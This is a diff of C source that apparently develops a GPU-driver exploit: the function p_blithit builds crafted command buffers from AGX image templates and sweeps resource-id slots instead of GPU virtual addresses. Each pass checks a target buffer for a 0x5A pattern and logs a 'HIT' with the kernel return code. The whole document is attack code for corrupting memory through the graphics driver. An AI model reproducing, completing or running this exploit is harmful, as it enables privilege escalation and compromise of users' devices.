@@ -12922,8 +12922,10 @@ static void p_blithit(void) {
     uint8_t *aux2 = must_map(0x1000);
     memset(aux1, 0, 0x1000); memset(aux2, 0, 0x1000);
     uint32_t *outw = (uint32_t *)must_map(0x100);
+    int ridslot = 0;
 
-    for (uint64_t g = 0x100000000ULL; g < 0x100400000ULL; g += 0x4000) {
+    for (ridslot = 0; ridslot < 0x30; ridslot++) {
+        uint64_t g = 0x100018000ULL;              // keep captured GPUVA (irrelevant if id-bound)
         memcpy(vaA, agx_A4_image, 0x4000);
         memcpy(vaB, agx_B4_image, 0x4000);
         *(uint64_t *)(vaA + 0xac + 0x340) = g;
@@ -12932,6 +12934,8 @@ static void p_blithit(void) {
         *(uint32_t *)(entry + 0x00) = idA;
         *(uint32_t *)(entry + 0x04) = idB;
         *(uint32_t *)(entry + 0x20) = rid;          // prepare reference -> GPU-map our resource
+        if (ridslot >= 0 && ridslot < 0x40)         // patch one resource-id slot in B
+            *(uint32_t *)(vaB + 0x40 + ridslot * 4) = rid;
         *(uint64_t *)(entry + 0x10) = (uint64_t)(uintptr_t)aux1;
         *(uint64_t *)(entry + 0x18) = (uint64_t)(uintptr_t)aux2;
         *outw = 0xdeadbeef;
@@ -12940,9 +12944,9 @@ static void p_blithit(void) {
         if (tgt[0] == 0x5A || tgt[0x20000] == 0x5A || tgt[0x3fff0] == 0x5A) {
             long c5 = 0;
             for (long j = 0; j < 0x40000; j++) if (tgt[j] == 0x5A) c5++;
-            LOG("[bh] *** HIT GPUVA 0x%llx: %ld 0x5A bytes (kr 0x%08x outw %08x)", g, c5, kt, *outw);
+            LOG("[bh] *** HIT slot %d: %ld 0x5A bytes (kr 0x%08x outw %08x)", ridslot, c5, kt, *outw);
         }
-        if (((g >> 20) & 0xf) == 0 && (g & 0xfffff) == 0) LOG("[bh] sweep 0x%llx alive", g);
+        if ((ridslot & 7) == 0) LOG("[bh] slot %d alive", ridslot);
     }
     LOG("[v76] sweep done (alive)");
 }
